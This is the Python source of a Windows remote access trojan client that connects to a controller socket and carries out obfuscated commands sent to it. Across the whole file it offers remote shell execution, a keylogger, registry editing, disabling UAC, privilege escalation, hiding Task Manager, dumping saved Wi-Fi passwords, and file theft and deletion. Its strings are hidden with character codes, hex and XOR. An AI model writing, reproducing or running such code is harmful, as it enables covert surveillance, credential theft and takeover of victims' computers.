import socket, subprocess, os, platform
from threading import Thread
from PIL import Image
from datetime import datetime
from ctypes import cast, POINTER
from winreg import *
import shutil
import glob
import ctypes
import sys
import pyautogui
from pynput.keyboard import Listener
from pynput.mouse import Controller
import time
import keyboard

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

#HWND_BROADCAST = 65535
#WM_SYSCOMMAND = 274
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2

class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())
        s.send(sending.encode())
    
    def errorsend(self):
        output_string = chr(110) + chr(111) + " " + chr(111) + chr(117) + chr(116) + chr(112) + chr(117) + chr(116)
        output = bytearray(output_string, encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        s.send(output)
        
    def keylogger(self):
        def on_press(key):
            if klgr == True:
                filename = chr(107) + chr(101) + chr(121) + chr(108) + chr(111) + chr(103) + chr(115) + "." + chr(116) + chr(120) + chr(116)
                with open(filename, 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()
    
    def block_task_manager(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            while (1):
                if block == True:
                    task_manager_str = bytes.fromhex('5461736b204d616e61676572').decode('utf-8')
                    hwnd = user32.FindWindowW(0, task_manager_str)
                    user32.ShowWindow(hwnd, 0)
                    ctypes.windll.kernel32.Sleep(500)
    
    def execute(self):
        while True:
            command = s.recv(1024).decode()
            
            if command == 'tjhpq':
                while 1:
                    command = s.recv(1024).decode()
        
                    exit_command = chr(101) + chr(120) + chr(105) + chr(116)
                    if command.lower() == exit_command:
                        break
                    
                    cd_command = chr(99) + chr(100)
                    if command == cd_command:
                        os.chdir(command[3:].decode('utf-8'))
                        dir = os.getcwd()
                        dir1 = str(dir)
                        s.send(dir1.encode())
                    
                    output = subprocess.getoutput(command)
                    s.send(output.encode())
                    
                    if not output:
                        self.errorsend()
            
            elif command == 'tgwzfrbm':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                key2 = s.recv(1024).decode()
                value = s.recv(1024).decode()
                hkey_current_user = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82)
                hkey_classes_root = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(76) + chr(65) + chr(83) + chr(83) + chr(69) + chr(83) + chr(95) + chr(82) + chr(79) + chr(79) + chr(84)
                hkey_local_machine = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(76) + chr(79) + chr(67) + chr(65) + chr(76) + chr(95) + chr(77) + chr(65) + chr(67) + chr(72) + chr(73) + chr(78) + chr(69)
                hkey_users = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82) + chr(83)
                hkey_current_config = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(67) + chr(79) + chr(78) + chr(70) + chr(73) + chr(71)
                try:
                    if const == hkey_current_user:
                        key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == hkey_classes_root:
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == hkey_local_machine:
                        key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == hkey_users:
                        key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    if const == hkey_current_config:
                        key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    value_is_set = chr(86) + chr(97) + chr(108) + chr(117) + chr(101) + " " + chr(105) + chr(115) + " " + chr(115) + chr(101) + chr(116)
                    s.send(value_is_set.encode())
                except:
                    error_msg = chr(73) + chr(109) + chr(112) + chr(111) + chr(115) + chr(115) + chr(105) + chr(98) + chr(108) + chr(101) + " " + chr(116) + chr(111) + " " + chr(99) + chr(114) + chr(101) + chr(97) + chr(116) + chr(101) + " " + chr(107) + chr(101) + chr(121)
                    s.send(error_msg.encode())

            elif command == 'egooje':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                hkey_current_user = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82)
                hkey_classes_root = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(76) + chr(65) + chr(83) + chr(83) + chr(69) + chr(83) + chr(95) + chr(82) + chr(79) + chr(79) + chr(84)
                hkey_local_machine = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(76) + chr(79) + chr(67) + chr(65) + chr(76) + chr(95) + chr(77) + chr(65) + chr(67) + chr(72) + chr(73) + chr(78) + chr(69)
                hkey_users = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82) + chr(83)
                hkey_current_config = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(67) + chr(79) + chr(78) + chr(70) + chr(73) + chr(71)
                try:
                    if const == hkey_current_user:
                        DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
                    if const == hkey_local_machine:
                        DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
                    if const == hkey_users:
                        DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
                    if const == hkey_classes_root:
                        DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
                    if const == hkey_current_config:
                        DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
                    key_deleted = bytes.fromhex('4b65792069732064656c65746564').decode('utf-8')
                    s.send(key_deleted.encode())
                except:
                    error_msg = bytes.fromhex('496d706f737369626c6520746f2064656c657465206b6579').decode('utf-8')
                    s.send(error_msg.encode())
            
            elif command == 'dtheykrmh':
                const = s.recv(1024).decode()
                root = s.recv(1024).decode()
                hkey_current_user = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82)
                hkey_classes_root = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(76) + chr(65) + chr(83) + chr(83) + chr(69) + chr(83) + chr(95) + chr(82) + chr(79) + chr(79) + chr(84)
                hkey_local_machine = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(76) + chr(79) + chr(67) + chr(65) + chr(76) + chr(95) + chr(77) + chr(65) + chr(67) + chr(72) + chr(73) + chr(78) + chr(69)
                hkey_users = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82) + chr(83)
                hkey_current_config = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(67) + chr(79) + chr(78) + chr(70) + chr(73) + chr(71)
                try:
                    if const == hkey_current_user:
                        CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                    if const == hkey_local_machine:
                        CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                    if const == hkey_users:
                        CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                    if const == hkey_classes_root:
                        CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                    if const == hkey_current_config:
                        CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                    key_created = bytes.fromhex('4b65792069732063726561746564').decode('utf-8')
                    s.send(key_created.encode())
                except:
                    error_msg = bytes.fromhex('496d706f737369626c6520746f20637265617465206b6579').decode('utf-8')
                    s.send(error_msg.encode())

            elif command == 'vuehwocmac':
                powershell_cmd = (
                    chr(112) + chr(111) + chr(119) + chr(101) + chr(114) + chr(115) + chr(104)
                    + chr(101) + chr(108) + chr(108) + chr(46) + chr(101) + chr(120) + chr(101)
                )
                ps_command = (
                    chr(71) + chr(101) + chr(116) + "-" + chr(80) + chr(110) + chr(112) + chr(68)
                    + chr(101) + chr(118) + chr(105) + chr(99) + " " + "-PresentOnly | "
                    + "Where-Object { $_.InstanceId -match '^USB' }"
                )
                p = subprocess.check_output([powershell_cmd, ps_command], encoding='utf-8')
                s.send(p.encode())
    
            elif command == 'nqqmyuya':
                powershell_cmd = (
                    chr(112) + chr(111) + chr(119) + chr(101) + chr(114) + chr(115) + chr(104)
                    + chr(101) + chr(108) + chr(108) + chr(46) + chr(101) + chr(120) + chr(101)
                )
                ps_command = bytes.fromhex(
                    '4765742d43696d496e7374616e6365202d4e616d65737061636520726f6f745c776d69202d436c6173734e616d6520576d694d6f6e69746f724261736963446973706c6179506172616d73'
                ).decode('utf-8')
                p = subprocess.check_output([powershell_cmd, ps_command], encoding='utf-8')
                s.send(p.encode())

            elif command == 'tavmslv':
                s = "S"
                y = "y"
                t = "t"
                e = "e"
                m = "m"
                c = "c"
                a = "a"
                h = "h"
                i = "i"
                o = "o"
                u = "u"
                r = "r"
                p = "p"
                t = "t"
                
                system_str = s + y + s + t + e + m
                architecture_str = a + r + c + h + i + t + e + c + t + u + r + e
                computer_name_str = "Name of Computer"
                processor_str = p + r + o + c + e + s + s + o + r
                python_str = "Python"
                java_str = "Java"
                user_str = "User"
                
                sysinfo = str(f'''
            {system_str}: {platform.platform()} {platform.win32_edition()}
            {architecture_str}: {platform.architecture()}
            {computer_name_str}: {platform.node()}
            {processor_str}: {platform.processor()}
            {python_str}: {platform.python_version()}
            {java_str}: {platform.java_ver()}
            {user_str}: {os.getlogin()}
                ''')
                s.send(sysinfo.encode())
            
            elif command == 'sgestz':
                os.system("shutdown /r /t 1")
                s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
            
            elif command[:7] == 'xtlxjou':
                pyautogui.write(command.split(" ")[1])
                s.send(f'{command.split(" ")[1]} is written'.encode())
            
            elif command[:8] == 'sgdhkosm':
                try:
                    f = open(command[9:], 'r')
                    data = f.read()
                    if not data: s.send("No data".encode())
                    f.close()
                    s.send(data.encode())
                except:
                    s.send("No such file in directory".encode())
            
            elif command[:7] == 'bdvtfzo':
                try:
                    path = os.path.abspath(command[8:])
                    s.send(path.encode())
                except:
                    s.send("No such file in directory".encode())

            elif command == 'qyg':
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif command == 'jrfsslpo':
                output = subprocess.check_output('ipconfig', encoding='oem')
                s.send(output.encode())
            
            elif command == 'qquxxihv':
                output = subprocess.check_output('netstat -an', encoding='oem')
                s.send(output.encode())
            
            elif command == 'ucvoqozb':
                output = subprocess.check_output('tasklist', encoding='oem')
                s.send(output.encode())

            elif command == 'qtrjnrla':
                output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
                s.send(output.encode())
            
            elif command == 'qtrjnrlxbgo':
                profile = s.recv(6000)
                profile = profile.decode()
                try:
                    output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
                    s.send(output.encode())
                except:
                    self.errorsend()
            
            elif command == 'tavxjspvoy':
                output = subprocess.check_output(f'systeminfo', encoding='oem')
                s.send(output.encode())
            
            elif command == 'tgqhrkzajqp':
                text = s.recv(6000).decode()
                title = s.recv(6000).decode()
                s.send('MessageBox has appeared'.encode())
                user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
            
            elif command == 'ekvegrlCJM':
                os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
            
            elif command == 'fzwisjyqpree':
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
                s.send(sending.encode())
            
            elif command == 'juxwjxhlvsy':
                if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
                    s.send(sending.encode())
                else:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                    s.send(sending.encode())

            elif command == 'lgbwhgu_ackcf':
                global klgr
                klgr = True
                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                Thread(target=self.keylogger, daemon=True).start()
                s.send("Keylogger is started".encode())
            
            elif command == 'tgqh_quna':
                try:
                    f = open("keylogs.txt", 'r')
                    lines = f.readlines()
                    f.close()
                    s.send(str(lines).encode())
                    os.remove('keylogs.txt')
                except:
                    self.errorsend()
            
            elif command == 'tvrt_pkftxqrqe':
                klgr = False
                s.send("The session of keylogger is terminated".encode())
            
            elif command == 'drx_gtxla':
                output = os.cpu_count()
                s.send(str(output).encode())

            elif command[:7] == 'egojnrl':
                try:
                    os.remove(command[8:])
                    s.send(f'{command[8:]} was successfully deleted'.encode())
                except:
                    self.errorsend()
            
            elif command[:8] == 'fflxkosm':
                try:
                    with open(command.split(" ")[1], 'a') as f:
                        f.write(command.split(" ")[2])
                        f.close()
                    sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
                    s.send(sending.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'dr':
                try: 
                    shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'nx':
                try:
                    shutil.move(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'df':
                command = command[3:]
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except:
                    s.send("No such directory".encode())
            
            elif command == 'df ..':
                os.chdir('..')
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif command == 'eku':
                try:
                    output = subprocess.check_output(["dir"], shell=True)
                    output = output.decode('utf8', errors='ignore')
                    s.send(output.encode())
                except:
                    self.errorsend()
            
            elif command[1:2] == ':':
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except: 
                    s.send("No such directory".encode())
            
            elif command[:10] == 'dtheykmquo':
                kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                s.send(f'{command[11:]} was created'.encode())

            elif command[:10] == 'tgdvhnmquo':
                for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
                    if x.endswith(command.split(" ")[1]):
                        path = os.path.abspath(x)
                        s.send(str(path).encode())
                    else:
                        continue
            
            elif command == 'dwutnj':
                pid = os.getpid()
                s.send(str(pid).encode())
            
            elif command == 'etlzjxz':
                drives = []
                bitmask = kernel32.GetLogicalDrives()
                letter = ord('A')
                while bitmask > 0:
                    if bitmask & 1:
                        drives.append(chr(letter) + ':\\')
                    bitmask >>= 1
                    letter += 1
                s.send(str(drives).encode())
            
            elif command[:4] == 'lkop':
                try:
                    os.system(f'TASKKILL /F /im {command[5:]}')
                    s.send(f'{command[5:]} was terminated'.encode())
                except:
                    self.errorsend()
            
            elif command == 'shutdown':
                os.system('shutdown /s /t 1')
                sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
                s.send()
            
            elif command == 'ekvegrlbjcvytf':
                global block
                block = True
                Thread(target=self.block_task_manager, daemon=True).start()
                s.send("Task Manager is disabled".encode())
            
            elif command == 'fpdfqkaibuxse':
                block = False
                s.send("Task Manager is enabled".encode())
            
            elif command == 'mqfeqzpun':
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                s.send(str(current_time).encode())
            
            elif command[:9] == 'tvdvylptn':
                try:
                    s.send(f'{command[10:]} was started'.encode())
                    os.startfile(command[10:])
                except:
                    self.errorsend()

            elif command[:8] == 'eqzrquhl':
                try:
                    file = open(command.split(" ")[1], 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()

            elif command == 'vrosfj':
                filename = s.recv(6000)
                newfile = open(filename, 'wb')
                data = s.recv(6000)
                newfile.write(data)
                newfile.close()
            
            elif command[:5] == 'nmgmw':
                try:
                    os.mkdir(command[6:])
                    s.send(f'Directory {command[6:]} was created'.encode())
                except:
                    self.errorsend()
            
            elif command[:5] == 'sogmw':
                try:
                    shutil.rmtree(command[6:])
                    s.send(f'Directory {command[6:]} was removed'.encode())
                except:
                    self.errorsend()

            elif command == 'fzlx':
                s.send(b"exit")
                break

rat = RAT_CLIENT('127.0.0.1', 4444)

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()